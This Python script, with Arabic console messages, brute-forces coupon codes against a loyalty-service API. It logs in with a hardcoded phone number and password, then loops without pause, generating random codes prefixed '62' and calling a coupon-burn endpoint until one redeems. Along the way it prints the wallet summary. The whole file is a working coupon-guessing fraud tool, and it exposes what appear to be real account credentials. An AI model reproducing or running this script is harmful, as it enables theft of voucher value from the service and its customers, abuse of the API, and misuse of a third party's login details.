import requests
import random
import json
import time
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

url_login = "https://exonidentityservice.dsquares.com/api/Account/login"
payload = {
  "mobileNumber": "01063875364",
  "password": "Qwer2486##",
  "DeviceId": None
}

headers_login = {
  'User-Agent': "okhttp/4.10.0",
  'Accept': "application/json, text/plain, */*",
  'Accept-Encoding': "gzip",
  'Content-Type': "application/json",
  'accept-language': "ar",
  'authorization': "Bearer null"
}

url_burn_coupon = "https://exonidentityservice.dsquares.com/api/couponz/BurnPreGeneratedCoupon"

def generate_coupon():
    random_number = ''.join([str(random.randint(0, 9)) for _ in range(12)])
    return f"62{random_number}"
#620227
while True:
    try:
        response = requests.post(url_login, data=json.dumps(payload), headers=headers_login)
        response.raise_for_status()  
        token = response.json()['token']
        print(f"{Fore.GREEN}تم الحصول على التوكن: {token}{Style.RESET_ALL}")
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}خطأ في الحصول على التوكن: {e}{Style.RESET_ALL}")
        continue   
    
    headers_burn = {
        'User-Agent': "okhttp/4.10.0",
        'Accept': "application/json, text/plain, */*",
        'Accept-Encoding': "gzip",
        'accept-language': "ar",
        'authorization': f"Bearer {token}"
    }

    coupon_number = generate_coupon()
    params = {
        'Channel': "MobileApp",
        'CouponNumber': coupon_number
    }

    try:
        response = requests.get(url_burn_coupon, params=params, headers=headers_burn)
        response.raise_for_status()  
        response_json = response.json()
        rr = "https://exonidentityservice.dsquares.com/api/Wallet/GetWalletSummary"
        headers = {
  'User-Agent': "okhttp/4.10.0",
  'Accept': "application/json, text/plain, */*",
  'Accept-Encoding': "gzip",
  'accept-language': "ar",
  'authorization': f"Bearer {token}"
}
        ff = requests.get(rr, headers=headers)

        if "errorMessage" in response_json:
            print(f"{Fore.YELLOW}الكود: {coupon_number} - الرسالة: {response_json['errorMessage']}{Style.RESET_ALL}")
            print(ff.text)
        else:
            print(f"{Fore.GREEN}الكود: {coupon_number} - الرد الناجح: {response_json}{Style.RESET_ALL}")
            break 

    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}خطأ في الطلب: {e}{Style.RESET_ALL}")

    time.sleep(0)
